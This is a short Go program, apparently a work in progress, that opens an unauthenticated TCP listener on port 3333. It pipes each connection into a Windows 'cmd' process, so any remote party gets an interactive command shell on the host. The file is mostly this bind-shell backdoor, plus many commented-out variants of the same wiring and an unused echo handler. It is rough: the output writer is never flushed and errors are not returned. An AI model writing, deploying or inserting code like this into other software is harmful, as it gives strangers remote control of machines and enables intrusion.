package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
)

const (
	CONN_HOST = "0.0.0.0"
	CONN_PORT = "3333"
	CONN_TYPE = "tcp"
)

func main() {
	// Listen for incoming connections.
	l, err := net.Listen(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
	if err != nil {
		fmt.Println("Error listening:", err.Error())
		os.Exit(1)
	}
	// Close the listener when the application closes.
	defer l.Close()
	fmt.Println("Listening on " + CONN_HOST + ":" + CONN_PORT)
	for {
		// Listen for an incoming connection.
		conn, err := l.Accept()
		if err != nil {
			fmt.Println("Error accepting: ", err.Error())
			os.Exit(1)
		}
		// Handle connections in a new goroutine.
		go handleConnection(conn)
	}
}
func handleConnection(c net.Conn) {
	defer c.Close()
	cmd := exec.Command("cmd")
	cmd.Stdin = bufio.NewReader(c)

	// writer := bufio.NewWriter(c)
	// writer.ReadFrom(cmd.Stdout)

	cmd.Stdout = bufio.NewWriter(c)

	// cmd := exec.Command("cmd")
	// cmd.Stdin = os.Stdin
	//cmd.Stdout = os.Stdout
	// cmd.Stderr = os.Stderr
	// cmd.Run()

	// if _, err := io.Copy(c, cmd.Stdout); err != nil {
	// 	log.Fatal(err)
	// }
	cmd.Run()
	// if _, err := io.Copy(os.Stdin, c); err != nil {
	// 	log.Fatal(err)
	// }
	// cmd := exec.Command("cmd")

	// io.Copy(cmd., c)
	// io.Copy(c, cmd.Stdin)
	// cmd.Stdin = os.Stdin
	// cmd.Stdout = os.Stdout
	// cmd.Stderr = os.Stderr

	// go cmd.Run()
	// if _, err := io.Copy(c, os.Stdin); err != nil {
	// 	log.Fatal(err)
	// }
	// if _, err := io.Copy(os.Stdout, c); err != nil {
	// 	log.Fatal(err)
	// }
	//io.Copy(cmd.Stdout, c)
	fmt.Printf("Connection from %v closed.\n", c.RemoteAddr())
}

// Handles incoming requests.
func handleRequest(conn net.Conn) {

	// Make a buffer to hold incoming data.
	buf := make([]byte, 1024)
	// Read the incoming connection into the buffer.
	_, err := conn.Read(buf)
	//fmt.Println(data)
	if err != nil {
		fmt.Println("Error reading:", err.Error())
	}
	// Send a response back to person contacting us.
	// conn.Write([]byte("Connected."))
	conn.Write([]byte("\n"))
	fmt.Println(string(buf))
	// Close the connection when you're done with it.
	//conn.Close()
}
